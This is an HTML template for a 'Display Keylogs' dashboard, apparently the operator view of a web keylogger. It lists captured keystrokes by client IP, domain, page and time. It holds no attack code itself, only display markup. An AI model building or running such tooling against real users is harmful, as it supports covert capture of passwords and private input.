<h1 class="page-header">Display Keylogs</h1>
<div class="row">
	<form id="keylogUserForm" action="AppController" method="GET">
		<div class="form-row">
			<input type="hidden" name="requestType" value="getKeyloggedUsers" />
			<div class="form-group col-sm-4 col-md-3 col-md-offset-3">
				<input type="text" id="logDate" class="form-control datePicker"
					name="logDate" placeholder="Enter Log Date" autocomplete="off" />
			</div>
			<div class="form-group col-sm-4 col-md-2">
				<button type="submit" class="btn btn-primary btn-block">View
					Users</button>
			</div>
		</div>
	</form>
</div>
<br>
<br>
<div class="row">
	<div class="col-md-12">
		<table id="keylogUserTable" class="table table-condensed">
			<thead>
				<tr>
					<th>CLIENT IP</th>
					<th>DOMAIN</th>
					<th>KEYLOGS</th>
					<th>DETAILED KEYLOGS</th>
				</tr>
			</thead>
			<tbody></tbody>
		</table>
	</div>
</div>

<!-- KeylogModal -->
<div class="modal fade" id="keylogModal" role="dialog">
	<div class="modal-dialog modal-lg">
		<div class="modal-content">
			<div class="modal-header">
				<h4 id="keylogModalTitle" class="modal-title"></h4>
			</div>
			<div id="keylogModalBody" class="modal-body">
				<textarea class="form-control" rows="20" readonly></textarea>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>

<!-- DetailedKeylogModal -->
<div class="modal fade" id="detailedKeylogModal" role="dialog">
	<div class="modal-dialog modal-lg">
		<div class="modal-content">
			<div class="modal-header">
				<h4 id="detailedKeylogModalTitle" class="modal-title"></h4>
			</div>
			<div id="detailedKeylogModalBody" class="modal-body">
				<div class="row">
					<div class="col-md-12">
						<table id="detailedKeylogTable" class="table table-condensed">
							<thead>
								<tr>
									<th>PAGE</th>
									<th>PRESSED KEY</th>
									<th>CREATED DATE</th>
								</tr>
							</thead>
							<tbody></tbody>
						</table>
					</div>
				</div>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>
<div id="errorMessage" class="center error-message"></div>
<div id="successMessage" class="center success-message"></div>

<script src="resources/app/js/displayKeylogs.js"></script>
